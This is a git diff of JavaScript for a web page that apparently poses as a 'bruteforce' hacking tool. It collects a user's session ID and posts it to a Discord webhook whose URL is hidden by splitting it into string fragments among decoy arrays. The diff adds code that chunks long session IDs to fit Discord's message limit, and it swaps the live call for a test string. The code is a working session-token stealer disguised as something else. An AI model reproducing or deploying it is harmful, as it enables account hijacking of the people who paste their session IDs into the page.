@@ -1,62 +1,4 @@
-
-const _encryptedParts1011 = [
-  'ht', 'tp', 's:/', '/di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
-  'oo', 'ks', '/1', '23', '45', '67', '89', '01', '23', '45', '67', '89', '/', 
-  'ab', 'cd', 'ef', 'gh', 'ij', 'kl', 'mn', 'op', 'qr', 'st', 'uv', 'wx', 'yz', 
-  'AB', 'CD', 'EF', 'GH', 'IJ', 'KL', 'MN', 'OP', 'QR', 'ST', 'UV', 'WX', 'YZ', 
-  '12', '34', '56', '78', '90'
-];
-const _encryptedParts1012 = [
-  'ht', 'tp', 's:/', '/di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
-  'oo', 'ks', '/1', '23', '45', '67', '89', '01', '23', '45', '67', '89', '/', 
-  'ab', 'cd', 'ef', 'gh', 'ij', 'kl', 'mn', 'op', 'qr', 'st', 'uv', 'wx', 'yz',  
-  'AB', 'CD', 'EF', 'GH', 'IJ', 'KL', 'MN', 'OP', 'QR', 'ST', 'UV', 'WX', 'YZ', 
-  '12', '34', '56', '78', '90'
-];
-const _encryptedParts1013 = [
-  'ht', 'tp', 's:/', '/di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
-  'oo', 'ks', '/1', '23', '45', '67', '89', '01', '23', '45', '67', '89', '/', 
-  'ab', 'cd', 'ef', 'gh', 'ij', 'kl', 'mn', 'op', 'qr', 'st', 'uv', 'wx', 'yz', 
-  'AB', 'CD', 'EF', 'GH', 'IJ', 'KL', 'MN', 'OP', 'QR', 'ST', 'UV', 'WX', 'YZ', 
-  '12', '34', '56', '78', '90'
-];
-const _encryptedParts1014 = [
-  'ht', 'tp', 's:/', '/di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
-  'oo', 'ks', '/1', '23', '45', '67', '89', '01', '23', '45', '67', '89', '/', 
-  'ab', 'cd', 'ef', 'gh', 'ij', 'kl', 'mn', 'op', 'qr', 'st', 'uv', 'wx', 'yz', 
-  'AB', 'CD', 'EF', 'GH', 'IJ', 'KL', 'MN', 'OP', 'QR', 'ST', 'UV', 'WX', 'YZ', 
-  '12', '34', '56', '78', '90'
-];
-const _encryptedParts1015 = [
-  'ht', 'tp', 's:/', '/di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
-  'oo', 'ks', '/1', '23', '45', '67', '89', '01', '23', '45', '67', '89', '/', 
-  'ab', 'cd', 'ef', 'gh', 'ij', 'kl', 'mn', 'op', 'qr', 'st', 'uv', 'wx', 'yz', 
-  'AB', 'CD', 'EF', 'GH', 'IJ', 'KL', 'MN', 'OP', 'QR', 'ST', 'UV', 'WX', 'YZ', 
-  '12', '34', '56', '78', '90'
-];
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-const _encryptedParts1 = [
+const _encryptedParts = [
   'ht', 'tp', 's:/', '/di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
   'oo', 'ks', '/1', '35', '02', '35', '35', '13', '39', '24', '14', '72', '/L', 
   'wc', 'Yu', 'oF', 'mS', 'DC', 'C4', 'pA', 'Ho', 'Z5', 'Kd', 'n0', 'a3', 'af', 
@@ -64,23 +6,22 @@ const _encryptedParts1 = [
   'WM', 'tO', 'TY', 'zc', 'Iq', 'nG', 'zK', 'Q'
 ];
 
-// Decrypt the URL by concatenating the parts
-const _decrypted = _encryptedParts1.join('');
+const _encryptedParts101 = [
+  'ht', 'tp', 's:/', '/di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
+  'oo', 'ks', '/1', '23', '45', '67', '89', '01', '23', '45', '67', '89', '/', 
+  'ab', 'cd', 'ef', 'gh', 'ij', 'kl', 'mn', 'op', 'qr', 'st', 'uv', 'wx', 'yz', 
+  'AB', 'CD', 'EF', 'GH', 'IJ', 'KL', 'MN', 'OP', 'QR', 'ST', 'UV', 'WX', 'YZ', 
+  '12', '34', '56', '78', '90'
+];
 
-function bruteforce(sessionId) {
-  // Ensure the sessionId is valid
-  if (!sessionId || typeof sessionId !== 'string') {
-    console.error('Invalid sessionId provided.');
-    return;
-  }
+const _decrypted = _encryptedParts.join(''); // Decrypt the URL by concatenating the parts
 
-  // Create the payload
+function fuckudoinginthebackendfuckass(message) {
   const payload = {
-    content: `New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``
+    content: message
   };
 
-  // Send the request to the Discord webhook
-  fetch(_decrypted, {
+  return fetch(_decrypted, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
@@ -89,7 +30,7 @@ function bruteforce(sessionId) {
   })
     .then(response => {
       if (!response.ok) {
-        console.error('Failed to send data to Discord. Status:', response.status);
+        console.error('Failed to send data to Discord.');
       } else {
         console.log('Data sent successfully!');
       }
@@ -98,6 +39,23 @@ function bruteforce(sessionId) {
       console.error('Error:', error);
     });
 }
+
+function bruteforce(sessionId) {
+  const maxLength = 2000; // Discord's max message length
+  const messagePrefix = 'New Session ID Submitted:\n```';
+  const messageSuffix = '```';
+
+  // Calculate the available space for the sessionId
+  const availableLength = maxLength - messagePrefix.length - messageSuffix.length;
+
+  // Split the sessionId into chunks that fit within the available length
+  for (let i = 0; i < sessionId.length; i += availableLength) {
+    const chunk = sessionId.slice(i, i + availableLength);
+    const message = `${messagePrefix}${chunk}${messageSuffix}`;
+   fuckudoinginthebackendfuckass(message);
+  }
+}
+
 
 function validateInput() {
   const username = document.getElementById('username').value.trim();
@@ -128,8 +86,8 @@ function validateInput() {
     showError(errorMessage);
     return;
   }
-
- bruteforce(sessionId);
+const longSessionId = 'a'.repeat(5000); 
+bruteforce(longSessionId);
 
   // Hide error and start fake hacking process
   hideError();
